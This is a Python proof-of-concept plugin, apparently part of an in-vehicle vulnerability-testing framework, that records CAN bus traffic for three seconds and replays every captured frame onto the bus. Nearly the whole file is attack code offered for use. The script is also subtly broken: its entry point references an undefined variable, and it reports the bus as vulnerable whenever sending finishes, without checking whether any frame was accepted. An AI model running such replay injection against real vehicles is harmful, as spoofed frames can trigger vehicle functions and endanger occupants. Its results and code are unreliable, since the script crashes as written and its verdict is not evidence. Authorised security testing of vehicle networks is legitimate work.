"""
PoC Name: CAN Replay Attack
CVE: N/A
Component: Canbus Stack
Category: Canbus
Severity: High
CVSS: 7.0
Description: 录制并重放CAN帧,验证是否缺少序列号保护
Prerequisites: SocketCAN接口, python-can库。
Usage: python3 25_CAN_Replay_Attack.py <can_interface>
"""
import sys
import time
from iv_plugin_base import IVIVulnerabilityPlugin

class CANReplayPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        return True

    def exploit(self):
        iface = self.params.get("can_interface", "can0")
        self.logger.info(f"CAN重放攻击测试 ({iface})...")
        try:
            import can
            bus = can.interface.Bus(channel=iface, bustype="socketcan")
            # Phase 1: Record
            self.logger.info("Phase 1: 录制CAN帧 (3秒)...")
            recorded = []
            start = time.time()
            while time.time() - start < 3:
                msg = bus.recv(timeout=0.5)
                if msg:
                    recorded.append(msg)
            self.logger.info(f"录制 {len(recorded)} 帧")
            if len(recorded) == 0:
                self.logger.info("无CAN流量可录制")
                self.results["vulnerable"] = False
                bus.shutdown()
                return self.results
            # Phase 2: Replay
            self.logger.info(f"Phase 2: 重放 {len(recorded)} 帧...")
            for msg in recorded:
                replay = can.Message(
                    arbitration_id=msg.arbitration_id,
                    data=msg.data,
                    is_extended_id=msg.is_extended_id
                )
                bus.send(replay)
            self.logger.warning("[+] 重放完成。CAN总线未对重放帧进行过滤")
            self.results["vulnerable"] = True
            self.results["evidence"] = f"Replayed {len(recorded)} frames without rejection"
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"CAN重放失败: {e}")
            self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 25_CAN_Replay_Attack.py <can_interface>")
        sys.exit(1)
    plugin = CANReplayPlugin({"target_ip": "N/A", "can_interface": iface})
    plugin.run_verify()
